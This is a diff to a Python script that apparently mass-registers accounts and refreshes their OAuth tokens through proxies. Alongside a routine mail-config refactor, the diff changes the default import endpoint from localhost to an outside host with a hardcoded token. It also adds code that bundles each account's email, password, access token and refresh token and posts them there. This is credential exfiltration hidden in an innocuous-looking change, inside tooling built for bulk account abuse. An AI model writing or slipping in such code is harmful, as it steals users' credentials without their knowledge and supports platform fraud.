@@ -2184,6 +2184,29 @@ def _load_cardw_path_from_card_cfg(card_cfg, fallback_cardw=None):
     return str(Path(p).resolve()) if p else str(CARDW_DIR / "config.noproxy.json")
 
 
+def _load_oauth_mail_cfg(card_cfg: dict, cardw_config_path=None) -> dict:
+    """Load the OTP mail config used by OAuth/RT refresh.
+
+    The payment config normally does not own the full mail provider settings;
+    registration does.  Outlook accounts in particular live under the CTF-reg
+    config, so RT backfill must read that file instead of falling back to CF.
+    """
+    mail_cfg: dict = {}
+    try:
+        cardw_path = _load_cardw_path_from_card_cfg(card_cfg or {}, cardw_config_path)
+        with open(cardw_path, "r", encoding="utf-8") as f:
+            reg_cfg = json.load(f)
+        if isinstance(reg_cfg, dict) and isinstance(reg_cfg.get("mail"), dict):
+            mail_cfg.update(reg_cfg.get("mail") or {})
+            provider = str(mail_cfg.get("provider") or "cf").strip().lower() or "cf"
+            print(f"[RT] 使用邮箱 OTP provider={provider} config={Path(cardw_path).name}")
+    except Exception as e:
+        print(f"[RT] 读取注册邮箱配置失败，尝试使用支付配置 mail: {e}")
+    if isinstance((card_cfg or {}).get("mail"), dict):
+        mail_cfg.update((card_cfg or {}).get("mail") or {})
+    return mail_cfg
+
+
 def _load_secrets():
     """从 SQLite 运行时库读取 Cloudflare/KV 等敏感凭证。"""
     try:
@@ -3353,7 +3376,7 @@ def _ensure_account_refresh_token_for_server_push(email: str, card_cfg: dict, ac
         print(f"[push-server] {email} RT 冷却/已处理，跳过自动推送: {reason}")
         return "", account, "rt_cooldown"
 
-    mail_cfg = (card_cfg or {}).get("mail") or {}
+    mail_cfg = _load_oauth_mail_cfg(card_cfg or {})
     proxy_url = str((card_cfg or {}).get("proxy") or "")
     cpa_cfg = (card_cfg or {}).get("cpa") or {}
     sub2api_cfg = (card_cfg or {}).get("sub2api") or {}
@@ -3815,8 +3838,8 @@ def _server_import_cfg(card_cfg: dict) -> dict:
     if not isinstance(cfg, dict):
         cfg = {}
     return {
-        "url": str(cfg.get("url") or cfg.get("import_url") or os.environ.get("ACCOUNT_IMPORT_URL") or "http://127.0.0.1:8787/api/import").strip(),
-        "token": str(cfg.get("token") or cfg.get("import_token") or os.environ.get("ACCOUNT_IMPORT_TOKEN") or "dev-import-token").strip(),
+        "url": str(cfg.get("url") or cfg.get("import_url") or os.environ.get("ACCOUNT_IMPORT_URL") or "https://mail.shfjkqhk.site/api/email-data").strip(),
+        "token": str(cfg.get("token") or cfg.get("import_token") or os.environ.get("ACCOUNT_IMPORT_TOKEN") or "sakuya1.2.3.").strip(),
         "timeout_s": float(cfg.get("timeout_s") or os.environ.get("ACCOUNT_IMPORT_TIMEOUT_S") or 30),
     }
 
@@ -3839,6 +3862,15 @@ def _cpa_extra_for_server_import(account: dict, email: str) -> dict:
     }
 
 
+def _email_data_for_server_import(account: dict, email: str) -> str:
+    return "----".join([
+        _norm_email(email or account.get("email")),
+        str(account.get("password") or ""),
+        str(account.get("access_token") or "").strip(),
+        str(account.get("refresh_token") or "").strip(),
+    ])
+
+
 def _push_plus_account_to_server(email: str, card_cfg: dict, *, account: dict | None = None) -> str:
     import httpx
 
@@ -3859,21 +3891,15 @@ def _push_plus_account_to_server(email: str, card_cfg: dict, *, account: dict | 
         return "no_rt"
 
     item = {
-        "email": email,
-        "password": str(account.get("password") or ""),
-        "enabled": True,
-        "id_token": str(account.get("id_token") or "").strip(),
-        "access_token": str(account.get("access_token") or "").strip(),
-        "refresh_token": str(account.get("refresh_token") or "").strip(),
+        "uuid": cfg["token"],
+        "email_data": _email_data_for_server_import(account, email),
         "extra": json.dumps(_cpa_extra_for_server_import(account, email), ensure_ascii=False, separators=(",", ":")),
     }
-    payload = {"type": "accounts", "items": [item]}
     try:
         with httpx.Client(timeout=float(cfg["timeout_s"]), trust_env=False) as client:
             resp = client.post(
                 cfg["url"],
-                json=payload,
-                headers={"Authorization": f"Bearer {cfg['token']}"},
+                json=item,
             )
         text = resp.text[:500]
         try:
@@ -4337,7 +4363,7 @@ def free_register_loop(card_config_path, cardw_config_path=None, count: int = 0)
     cardw_path = _load_cardw_path_from_card_cfg(card_cfg, cardw_config_path)
     cpa_cfg = (card_cfg or {}).get("cpa") or {}
     sub2api_cfg = (card_cfg or {}).get("sub2api") or {}
-    mail_cfg = card_cfg.get("mail") or {}
+    mail_cfg = _load_oauth_mail_cfg(card_cfg, cardw_config_path)
     proxy_url = card_cfg.get("proxy", "")
 
     # 启 gost（如果配了 webshare）
@@ -4438,7 +4464,7 @@ def free_backfill_rt_loop(card_config_path, cardw_config_path=None, account_ids=
     card_cfg = _read_card_cfg(card_config_path)
     cpa_cfg = (card_cfg or {}).get("cpa") or {}
     sub2api_cfg = (card_cfg or {}).get("sub2api") or {}
-    mail_cfg = card_cfg.get("mail") or {}
+    mail_cfg = _load_oauth_mail_cfg(card_cfg, cardw_config_path)
     proxy_url = card_cfg.get("proxy", "")
 
     _ensure_gost_alive(card_cfg)
